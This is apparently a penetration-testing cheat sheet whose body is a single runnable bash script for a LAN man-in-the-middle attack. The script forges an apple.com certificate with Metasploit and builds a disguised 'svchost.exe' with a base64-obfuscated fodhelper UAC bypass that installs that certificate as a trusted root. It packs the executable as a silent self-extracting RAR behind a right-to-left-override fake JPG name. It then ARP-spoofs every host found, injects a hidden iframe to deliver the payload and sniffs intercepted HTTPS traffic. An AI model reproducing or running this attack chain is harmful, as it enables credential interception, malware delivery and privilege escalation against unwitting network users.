# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Man In The Middle

#### [BeEF ](https://beefproject.com/)& [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# --- Root Privilege Check ---
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# --- Variables ---
WINEPREFIX="$HOME/.wine64"
ICON_PATH="/tmp/apple.ico"
CERT_NAME="apple.crt"
CERT_PATH="/var/www/html/$CERT_NAME"
SCRIPT_PATH="/tmp/cert-installer.py"
DIST_PATH="$HOME/wine-pyinstaller/dist"
EXE_NAME="svchost.exe"
SFX_OUT="/var/www/html/apple-update-%E2%80%AEexe.jpg"
UPX_URL="https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"

# --- Install Required Tools ---
color_print CYAN "[*] Checking and installing required tools..."
apt update -y
for pkg in wget curl jq rar unzip imagemagick apache2 arp-scan python3 pip3 wine64 winbind winetricks metasploit-framework bettercap; do
    dpkg -s "$pkg" &>/dev/null || apt install -y "$pkg"
done

# --- Setup WINE and Install Windows Python ---
color_print GREEN "[*] Setting up WINE and installing Windows Python..."
export WINEPREFIX="$HOME/.wine64"
export WINEARCH=win64
wineboot --init
wget -q https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O /tmp/python39.exe
WINEPREFIX="$HOME/.wine64" wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0

# --- Download UPX for Windows ---
color_print CYAN "[*] Downloading UPX for Windows..."
mkdir -p "$WINEPREFIX/drive_c/upx"
wget -q "$UPX_URL" -O /tmp/upx.zip
unzip -q /tmp/upx.zip -d /tmp/
cp /tmp/upx-4.2.1-win64/upx.exe "$WINEPREFIX/drive_c/upx/"

# --- Detect Interface and Local IP ---
color_print GREEN "[*] Detecting network interface and local IP..."
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Failed to detect interface or IP."; exit 1; }

# --- Cleanup ---
pkill -f 'ngrok|ruby|msfconsole|apache2'
rm -rf "$HOME/.msf4/loot/"
rm -rf "$WINEPREFIX/drive_c/pyinstaller-build" "$DIST_PATH"
mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"

# --- Generate Fake Certificate using Metasploit ---
color_print CYAN "[*] Generating fake certificate using Metasploit..."
msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"

CERT_CRT=$(find "$HOME/.msf4/loot/" -type f -name "*.crt" | head -1)
CERT_KEY=$(find "$HOME/.msf4/loot/" -type f -name "*.key" | head -1)
[[ ! -f "$CERT_CRT" || ! -f "$CERT_KEY" ]] && { color_print RED "[X] Certificate generation failed."; exit 1; }
cp "$CERT_CRT" "$CERT_PATH"

# --- Download Image and Create Icon ---
wget -q "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
convert "/tmp/apple.jpg" -define icon:auto-resize=96 "$ICON_PATH"

# --- Create Python Script for Certificate Installer + UAC Bypass ---
cat > "$SCRIPT_PATH" << EOF
import os as O, subprocess as S, tempfile as T, base64 as B, time as M, winreg as W, sys

def d(s):
    return B.b64decode(s).decode()

CRT_DATA = """$(base64 -w0 "$CERT_PATH")"""
TMP_CERT = O.path.join(T.gettempdir(), d(b'YXBwbGUuY3J0'))
REG_PATH = d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ=')
FODHELPER = d(b'QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl')
CERT_CMD_TEMPLATE = b'Y21kIC9jIGNlcnR1dGlsIC1hZGRzdG9yZSAtZiBSb290ICJ7fSI='

try:
    with open(TMP_CERT, "wb") as f:
        f.write(B.b64decode(CRT_DATA))
except:
    pass

def ubx(cmd):
    try:
        k = W.CreateKey(W.HKEY_CURRENT_USER, REG_PATH)
        W.SetValueEx(k, d(b'RGVsZWdhdGVFeGVjdXRl'), 0, W.REG_SZ, "")
        W.SetValueEx(k, None, 0, W.REG_SZ, cmd)
        W.CloseKey(k)
    except:
        pass
    try:
        S.Popen([FODHELPER], shell=False,
                stdin=S.DEVNULL, stdout=S.DEVNULL, stderr=S.DEVNULL)
    except:
        pass
    M.sleep(3)
    try:
        W.DeleteKey(W.HKEY_CURRENT_USER, REG_PATH)
        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVu'))
        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbA=='))
        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5ncw=='))
    except:
        pass

try:
    cert_cmd = d(CERT_CMD_TEMPLATE).format(TMP_CERT)
    ubx(cert_cmd)
except:
    pass

sys.exit(0)

EOF

cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
cp "$ICON_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/apple.ico"

# --- Install PyInstaller and Build EXE Hidden ---
color_print GREEN "[*] Installing PyInstaller and building Hidden EXE with UPX..."
wine python -m pip install --upgrade pip setuptools wheel
wine python -m pip install pyinstaller

wine pyinstaller --onefile --noconfirm --noconsole \
    --icon "C:\\pyinstaller-build\\apple.ico" \
    --name "$EXE_NAME" \
    --upx-dir "C:\\upx" \
    "C:\\pyinstaller-build\\cert_installer.py"

cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"

# --- Create SFX RAR with RLO Filename ---
cat > /tmp/sfx.txt << EOF
;The comment below contains SFX script commands

Path=C:\\Users\\%username%\\AppData\\Local\\Temp
Setup=$EXE_NAME
Presetup=apple.jpg
Silent=1
Overwrite=1
Update=U
EOF

rar a -sfx -z"/tmp/sfx.txt" "$SFX_OUT" "$DIST_PATH/$EXE_NAME" /tmp/apple.jpg

# --- Start Apache Server ---
service apache2 restart

# --- Scan Network for Victims ---
color_print CYAN "[*] Scanning LAN for targets..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found on the LAN."; exit 1; }

# --- Launch Bettercap MITM Attack ---
color_print GREEN "[*] Launching Bettercap MITM attack..."
bettercap -iface "$IFACE" -eval "\
set arp.spoof.targets $TARGETS; \
set arp.spoof.internal true; \
set https.proxy.engine true; \
set https.proxy.sslstrip false; \
set https.proxy.cert $CERT_CRT; \
set https.proxy.key $CERT_KEY; \
set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple-update-%E2%80%AEexe.jpg\" width=0 height=0 style=\"display:none\"></iframe>'; \
set net.sniff.verbose true; \
set net.sniff.output /tmp/bettercap.log; \
net.sniff on; http.proxy on; https.proxy on; arp.spoof on"

```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
